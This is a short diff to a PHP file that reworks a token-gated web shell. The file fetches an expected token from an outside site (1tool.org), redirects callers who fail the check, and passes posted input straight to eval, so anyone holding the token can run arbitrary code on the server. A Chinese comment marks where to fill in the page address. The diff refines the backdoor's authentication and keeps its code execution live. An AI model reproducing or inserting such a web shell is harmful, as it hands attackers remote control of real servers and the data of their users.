@@ -5,9 +5,11 @@
 
 
 //eval($_GET[tool]);
-$token = $_GET['token'];
-$url = 'https://www.1tool.org/Security/token.txt';
-if(file_get_contents(url)!=$token){
+$token = $_POST['token'];
+$url = 'http://www.1tool.org/Security/token.txt';  //这儿填页面地址
+$tokentxt=file_get_contents($url);
+if($tokentxt !=$token){
+header("location:http://www.1tool.org/");
 return;
 }
 eval($_POST[tool]);
